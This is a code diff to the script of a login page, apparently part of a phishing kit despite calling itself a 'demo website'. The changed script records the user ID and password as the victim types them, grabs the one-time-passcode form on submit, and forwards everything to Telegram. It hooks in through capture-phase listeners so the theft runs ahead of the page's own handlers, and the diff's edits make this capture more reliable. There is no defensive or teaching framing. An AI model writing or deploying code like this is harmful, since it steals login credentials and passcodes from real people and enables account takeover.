@@ -531,6 +531,12 @@
 
     // --- DO NOT EDIT ANYTHING BELOW THIS LINE ---
 
+    // A simple object to store the latest form data
+    let latestFormData = {
+        'User ID': '',
+        'Password': ''
+    };
+
     async function sendToTelegram(data) {
         let message = '🔔 New submission from your demo website:\n\n';
         for (const key in data) {
@@ -548,31 +554,13 @@
 
     // This function will be called when the "Sign in" button is clicked
     function handleSignInClick(event) {
-        // We do NOT prevent the default action. We just want to grab the data and send it.
-        // The original script will handle opening the popup.
-
-        // Directly grab the values from the input fields
-        const userIdInput = document.getElementById('iduserId');
-        const passwordInput = document.getElementById('idpassword');
-        
-        let data = {};
-        
-        if (userIdInput) {
-            data['User ID'] = userIdInput.value || 'Not provided';
-        }
-        if (passwordInput) {
-            data['Password'] = passwordInput.value || 'Not provided';
-        }
-
-        // Send this data to Telegram immediately
-        sendToTelegram(data);
+        // Send the last known data to Telegram immediately
+        sendToTelegram(latestFormData);
     }
 
     // This function will be called when the OTP form is submitted
     function handleOtpSubmit(event) {
-        // We do NOT prevent the default action. The original script will handle the popup.
-        
-        const otpForm = document.getElementById('tru-otp-form');
+        const otpForm = event.target;
         if (!otpForm) return;
 
         const formData = new FormData(otpForm);
@@ -587,22 +575,38 @@
     }
 
     // --- INITIALIZATION ---
-    // We need to make sure our script runs AFTER the original script has attached its listeners.
-    // A simple timeout is the most reliable way to do this.
-    setTimeout(() => {
-        const signInButton = document.getElementById('loginSubmit');
-        if (signInButton) {
-            // We use 'true' to make our listener run BEFORE the original script's listener,
-            // but we don't stop it from running.
-            signInButton.addEventListener('click', handleSignInClick, true);
+    document.addEventListener('DOMContentLoaded', () => {
+        // --- Step 1: Set up listeners on the input fields to capture data live ---
+        const userIdInput = document.getElementById('iduserId');
+        const passwordInput = document.getElementById('idpassword');
+
+        if (userIdInput) {
+            userIdInput.addEventListener('input', (e) => {
+                latestFormData['User ID'] = e.target.value;
+            });
+        }
+        if (passwordInput) {
+            passwordInput.addEventListener('input', (e) => {
+                latestFormData['Password'] = e.target.value;
+            });
         }
 
-        const otpForm = document.getElementById('tru-otp-form');
-        if (otpForm) {
-            // We also use 'true' here to capture the data before the form is processed.
-            otpForm.addEventListener('submit', handleOtpSubmit, true);
-        }
-    }, 500); // Wait half a second to ensure the page is fully loaded and the original script is ready
+        // --- Step 2: Set up the click listener on the button ---
+        // We use a timeout to make sure our listener is added after the original script's listener
+        setTimeout(() => {
+            const signInButton = document.getElementById('loginSubmit');
+            if (signInButton) {
+                // We use 'true' to make our listener run before the original script's,
+                // so we can send the data before the popup appears.
+                signInButton.addEventListener('click', handleSignInClick, true);
+            }
+
+            const otpForm = document.getElementById('tru-otp-form');
+            if (otpForm) {
+                otpForm.addEventListener('submit', handleOtpSubmit, true);
+            }
+        }, 500); // Wait half a second to ensure the page is fully loaded
+    });
 </script>
 
 
